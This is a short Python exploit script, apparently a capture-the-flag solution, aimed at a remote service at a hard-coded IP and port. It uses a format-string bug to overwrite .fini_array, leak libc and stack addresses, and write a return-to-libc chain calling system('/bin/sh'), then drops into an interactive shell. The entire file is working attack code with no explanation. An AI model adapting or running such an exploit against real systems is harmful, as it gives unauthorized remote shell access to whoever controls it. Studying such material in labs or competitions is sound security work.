#!/usr/bin/env python
from sc_pwn import *

#target     = {'host':'192.168.75.129','port':8080}
target     = {'host':'175.119.158.131','port':17171}

addr_fini_arr       = 0x080496dc
addr_got_main       = 0x080497ec
addr_main           = 0x0804849b
'''
offset_libc_stdin   = 0x001aac20
offset_libc_exit    = 0x000331e0
offset_libc_system  = 0x00040190
offset_libc_str_sh  = 0x00160a24
'''
offset_libc_stdin   = 0x001b7600
offset_libc_exit    = 0x0002eca0
offset_libc_system  = 0x0003b180
offset_libc_str_sh  = 0x0015f61b

#==========
def attack(cmn):
    exploit  = '%2$08x%264$08x'
    fsb = FSB(header=len(exploit),count=16-len(exploit), size=2)
    fsb.set_adrval(addr_fini_arr, addr_main)
    fsb.auto_write(index=7)
    exploit += fsb.get()
    cmn.sendln(exploit)

    cmn.read_until('RESPONSE :')
    addr_libc_stdin = int(cmn.read(8),16)
    addr_stack_ret  = int(cmn.read(8),16)-0xe4
    
    addr_libc_base      = addr_libc_stdin - offset_libc_stdin
    addr_libc_system    = addr_libc_base + offset_libc_system
    addr_libc_exit      = addr_libc_base + offset_libc_exit
    addr_libc_str_sh    = addr_libc_base + offset_libc_str_sh
    info('addr_libc_base = 0x%08x' % addr_libc_base)
    info('addr_stack_ret = 0x%08x' % addr_stack_ret)

    cmn.read_all()

    fsb = FSB(size=2)
    fsb.set_adrval(addr_stack_ret    , addr_libc_system)
    fsb.set_adrval(addr_stack_ret+0x4, addr_libc_exit)
    fsb.set_adrval(addr_stack_ret+0x8, addr_libc_str_sh)
    fsb.auto_write(index=7)
    cmn.sendln(fsb.get())
    
    cmn.read_all()

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='RAW')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
